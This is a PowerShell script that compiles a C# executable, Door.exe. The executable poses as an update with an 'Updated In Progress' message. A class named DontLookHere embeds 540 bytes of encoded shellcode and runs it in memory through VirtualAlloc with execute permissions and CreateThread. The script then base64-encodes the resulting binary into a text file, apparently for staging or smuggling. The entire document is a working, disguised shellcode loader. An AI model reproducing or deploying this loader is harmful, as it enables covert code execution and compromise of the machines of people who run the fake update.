$EXEC='C:\Test\Door.exe'
$TEXT='C:\Test\Door.txt'

Add-Type -TypeDefinition @'
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
　

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Updated In Progress....");
			
	}
	
}
　
　
　
public class DontLookHere
{
		public static void Legit()
		{
			byte[] shellcode = new byte[540] {
		
0xbf,0x41,0xa8,0xf3,0xaa,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,
0x81,0x31,0x7e,0x13,0x83,0xee,0xfc,0x03,0x7e,0x4e,0x4a,0x06,0x56,0xb8,0x08,
0xe9,0xa7,0x38,0x6d,0x63,0x42,0x09,0xad,0x17,0x06,0x39,0x1d,0x53,0x4a,0xb5,
0xd6,0x31,0x7f,0x4e,0x9a,0x9d,0x70,0xe7,0x11,0xf8,0xbf,0xf8,0x0a,0x38,0xa1,
0x7a,0x51,0x6d,0x01,0x43,0x9a,0x60,0x40,0x84,0xc7,0x89,0x10,0x5d,0x83,0x3c,
0x85,0xea,0xd9,0xfc,0x2e,0xa0,0xcc,0x84,0xd3,0x70,0xee,0xa5,0x45,0x0b,0xa9,
0x65,0x67,0xd8,0xc1,0x2f,0x7f,0x3d,0xef,0xe6,0xf4,0xf5,0x9b,0xf8,0xdc,0xc4,
0x64,0x56,0x21,0xe9,0x96,0xa6,0x65,0xcd,0x48,0xdd,0x9f,0x2e,0xf4,0xe6,0x5b,
0x4d,0x22,0x62,0x78,0xf5,0xa1,0xd4,0xa4,0x04,0x65,0x82,0x2f,0x0a,0xc2,0xc0,
0x68,0x0e,0xd5,0x05,0x03,0x2a,0x5e,0xa8,0xc4,0xbb,0x24,0x8f,0xc0,0xe0,0xff,
0xae,0x51,0x4c,0x51,0xce,0x82,0x2f,0x0e,0x6a,0xc8,0xdd,0x5b,0x07,0x93,0x89,
0xf5,0x7d,0x58,0x49,0x62,0x09,0xc9,0x27,0x1b,0xa1,0x61,0xfb,0xac,0x6f,0x75,
0xfc,0x86,0x41,0xa2,0x51,0x7a,0xf1,0x07,0x06,0x14,0xcf,0xf1,0xd1,0x43,0xd0,
0x2b,0x72,0xdf,0x45,0xd7,0x27,0x8c,0xf1,0x6c,0xc6,0x32,0x02,0x7b,0xe1,0x33,
0x02,0x7b,0xde,0x4a,0x3b,0x24,0x58,0xfc,0x6f,0x90,0xf7,0xc8,0xfc,0x73,0x41,
0x06,0x6c,0x28,0x2b,0x5b,0x05,0xa0,0x84,0xe9,0x9e,0x13,0xba,0x54,0x27,0xf3,
0x7e,0x50,0x9f,0xcc,0x0f,0xd5,0xec,0x4b,0x95,0xa1,0x22,0xdb,0x50,0x62,0x35,
0x48,0xeb,0xaf,0x81,0xc5,0xa6,0xf7,0x9d,0x90,0x4c,0x4e,0x3f,0x17,0xc7,0x3b,
0x8e,0x01,0x6e,0x83,0xa5,0xd5,0xd7,0x7c,0x23,0x7f,0xb6,0xd2,0xef,0x1c,0x0c,
0x81,0xa2,0xac,0x18,0x5f,0x65,0x5e,0x89,0xcc,0xed,0xf0,0x7c,0xa0,0x7b,0xb5,
0x0a,0x6b,0xd7,0x5f,0x9e,0x3e,0xe3,0xf4,0x2d,0xf6,0x3e,0x45,0xe8,0x96,0x3a,
0x3b,0x7c,0x03,0xdd,0xfc,0xe5,0xb2,0x45,0x2e,0xaa,0x14,0xe5,0x54,0x04,0xfb,
0x9f,0xda,0x0b,0x54,0x2f,0xab,0xaa,0x28,0x99,0x5d,0x06,0xa4,0x80,0xd5,0xa3,
0x79,0x0c,0x66,0x91,0xec,0xf0,0xc4,0x53,0x8a,0x98,0x9c,0xa9,0x07,0x33,0x4f,
0xbe,0x9f,0xe3,0x27,0x38,0xe0,0x53,0xd0,0xef,0x69,0xcc,0xe6,0xf0,0xbf,0x7a,
0x20,0x5d,0x28,0x7d,0x9f,0x81,0x2c,0x2e,0x8c,0x12,0x7a,0x82,0x64,0xfc,0x6f,
0x71,0xa7,0xc7,0x90,0xaf,0x21,0x5d,0x65,0x0f,0x26,0x21,0x4a,0xaf,0xb6,0xa8,
0x4d,0xc5,0xb2,0xfa,0xe7,0x05,0xed,0x92,0x82,0x7f,0x8f,0xe4,0x92,0x55,0xfc,
0xbb,0x3f,0x05,0x55,0x53,0xed,0xaf,0x41,0xd8,0x12,0x7a,0xf4,0xde,0x98,0x91,
0x9f,0x56,0x71,0x9a,0x5f,0x0e,0x32,0x6a,0x6a,0x2e,0x45,0x5f,0xda,0xdb,0x77,
0x88,0xae,0x23,0x88,0x49,0x5b,0x63,0xe0,0x49,0x8b,0x63,0xf0,0x21,0xab,0x63,
0xb0,0xb1,0xf8,0x0b,0x68,0x16,0xad,0x2e,0x77,0x83,0xc1,0xe3,0xdb,0xa5,0x01,
0x54,0xb4,0xb5,0xed,0x5a,0x44,0xe5,0xbb,0x32,0x56,0x9f,0xcd,0x20,0xa9,0x4a,
0x48,0x64,0x22,0xba,0xd8,0x63,0xca,0x87,0x5a,0xab,0xb9,0xe2,0x3d,0xe8,0x1d,
0x05,0xd6,0x11,0x5e,0x2a,0x18,0xd4,0x93,0xfb,0x6a,0x10,0xec,0x2d,0xba,0x6f,
0x22,0x03,0xf6,0xb7,0x3a,0xd8,0x06,0x72,0x98,0x48,0x8d,0x7c,0x8e,0x8b,0x84 };
　
 
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
								MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
			IntPtr hThread = IntPtr.Zero;
			UInt32 threadId = 0;
			// prepare data
 
 
			IntPtr pinfo = IntPtr.Zero;
 
			// execute native code
 
			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
			WaitForSingleObject(hThread, 0xFFFFFFFF);
			return;
			
	  }
 
		private static UInt32 MEM_COMMIT = 0x1000;
 
		private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
　
		[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
　
	
　
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(
　
	  UInt32 lpThreadAttributes,
	  UInt32 dwStackSize,
	  UInt32 lpStartAddress,
	  IntPtr param,
	  UInt32 dwCreationFlags,
	  ref UInt32 lpThreadId
　
	  );
	[DllImport("kernel32")]
	private static extern bool CloseHandle(IntPtr handle);
　
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(
　
	  IntPtr hHandle,
	  UInt32 dwMilliseconds
	  );
	
		
 
	}
'@  -OutputAssembly $EXEC

$Program_bytes = Get-Content -Path $EXEC  -Encoding Byte
$Program_encoded = [System.Convert]::ToBase64String($Program_bytes)
$Program_encoded | Out-File $TEXT